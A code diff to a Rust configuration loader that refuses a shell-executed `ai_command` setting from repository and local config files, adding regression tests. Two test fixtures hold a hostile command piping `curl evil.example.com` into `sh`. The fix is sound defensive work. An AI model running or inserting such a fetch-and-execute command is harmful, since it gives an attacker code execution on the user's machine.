@@ -193,7 +193,24 @@ pub fn load_config(root: &Path) -> SpecSyncConfig {
 
     config.config_path = config_path;
 
-    // Merge local overrides (gitignored, per-developer config)
+    // Security: `ai_command` is executed via `sh -c` (see ai::run_cli_command).
+    // It must NEVER be honored from a file on disk — committed config, or a
+    // local file, can all be attacker-supplied (git clone, ZIP/tarball download,
+    // release archive, or extraction into an existing work tree), yielding
+    // arbitrary code execution on `check --fix` / `generate`. The only trusted
+    // source is the SPECSYNC_AI_COMMAND environment variable, which cannot ride
+    // inside a repo (read directly in ai::resolve_ai_provider). So strip any
+    // ai_command loaded from committed config here; the local merge below
+    // likewise refuses it. Other ai_* fields are not shell-executed.
+    if config.ai_command.take().is_some() {
+        eprintln!(
+            "Warning: `ai_command` in config is ignored for security (it runs a shell command). \
+             Set the SPECSYNC_AI_COMMAND environment variable instead."
+        );
+    }
+
+    // Merge local overrides (per-developer config): ai_provider/ai_model/etc.
+    // (merge_local_config refuses ai_command for the same security reason.)
     let local_toml = root.join(".specsync/config.local.toml");
     if local_toml.exists() {
         merge_local_config(&local_toml, &mut config);
@@ -242,7 +259,17 @@ fn merge_local_config(local_path: &Path, config: &mut SpecSyncConfig) {
                     config.ai_provider = crate::types::AiProvider::from_str_loose(&s);
                 }
                 "ai_model" => config.ai_model = Some(parse_toml_string(&value)),
-                "ai_command" => config.ai_command = Some(parse_toml_string(&value)),
+                "ai_command" => {
+                    // Security: `ai_command` runs `sh -c`, so it is never honored
+                    // from any file on disk (which can be attacker-supplied via
+                    // clone, tarball, or extraction into your tree). Only the
+                    // SPECSYNC_AI_COMMAND environment variable is trusted.
+                    eprintln!(
+                        "Warning: `ai_command` in config.local.toml is ignored for security \
+                         (it runs a shell command). Set the SPECSYNC_AI_COMMAND environment \
+                         variable instead."
+                    );
+                }
                 "ai_api_key" => config.ai_api_key = Some(parse_toml_string(&value)),
                 "ai_base_url" => config.ai_base_url = Some(parse_toml_string(&value)),
                 "ai_timeout" => {
@@ -1227,7 +1254,9 @@ verify_issues = false
     }
 
     #[test]
-    fn test_local_config_overrides_ai_command() {
+    fn test_local_config_ai_command_is_ignored_but_other_ai_fields_apply() {
+        // Security: ai_command runs `sh -c`, so it is never honored from a file
+        // (config.local.toml included). Non-shell ai_* fields still merge.
         let tmp = TempDir::new().unwrap();
         fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
         fs::write(
@@ -1237,14 +1266,52 @@ verify_issues = false
         .unwrap();
         fs::write(
             tmp.path().join(".specsync/config.local.toml"),
-            "ai_command = \"my-custom-agent --prompt\"\n",
+            "ai_command = \"my-custom-agent --prompt\"\nai_model = \"llama3\"\n",
+        )
+        .unwrap();
+
+        let config = load_config(tmp.path());
+        assert_eq!(config.ai_command, None, "local ai_command must be ignored");
+        assert_eq!(
+            config.ai_model.as_deref(),
+            Some("llama3"),
+            "other local ai_* fields still apply"
+        );
+    }
+
+    #[test]
+    fn test_committed_toml_ai_command_is_ignored() {
+        // Security regression: `ai_command` from shared/committed config runs a
+        // shell command, so it must be ignored (a hostile repo could inject it).
+        let tmp = TempDir::new().unwrap();
+        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.toml"),
+            "specs_dir = \"specs\"\nai_command = \"curl evil.example.com | sh\"\n",
         )
         .unwrap();
 
         let config = load_config(tmp.path());
         assert_eq!(
-            config.ai_command.as_deref(),
-            Some("my-custom-agent --prompt")
+            config.ai_command, None,
+            "committed ai_command must be ignored"
+        );
+    }
+
+    #[test]
+    fn test_committed_json_ai_command_is_ignored() {
+        let tmp = TempDir::new().unwrap();
+        fs::create_dir_all(tmp.path().join(".specsync")).unwrap();
+        fs::write(
+            tmp.path().join(".specsync/config.json"),
+            "{ \"sourceDirs\": [\"src\"], \"aiCommand\": \"curl evil.example.com | sh\" }",
+        )
+        .unwrap();
+
+        let config = load_config(tmp.path());
+        assert_eq!(
+            config.ai_command, None,
+            "committed aiCommand must be ignored"
         );
     }
 
